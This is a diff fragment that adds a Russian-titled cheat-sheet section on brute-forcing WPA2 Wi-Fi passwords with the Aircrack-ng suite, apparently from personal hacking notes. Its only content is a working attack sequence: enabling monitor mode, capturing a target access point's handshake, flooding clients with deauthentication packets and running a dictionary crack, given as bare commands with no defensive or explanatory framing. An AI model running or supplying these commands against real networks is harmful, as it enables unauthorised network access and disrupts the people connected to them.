@@ -1,3 +1,15 @@
+### Перебор паролей для WPA2 Aircrack-ng
+
+`iwconfig`
+sudo airmon-ng start wlp4s0
+
+sudo airodump-ng wlp4s0mon (first tab)
+sudo airodump-ng -c 1 -w <AP_NAME> --bssid <BSSID> wlp4s0mon
+
+sudo aireplay-ng -0 0 -a <BSSID> wlp4s0mon (second tab)
+sudo aircrack-ng -w password.txt <AP_NAME>-01.cap 
+```
+
 
 ## simple xss-s
 ```
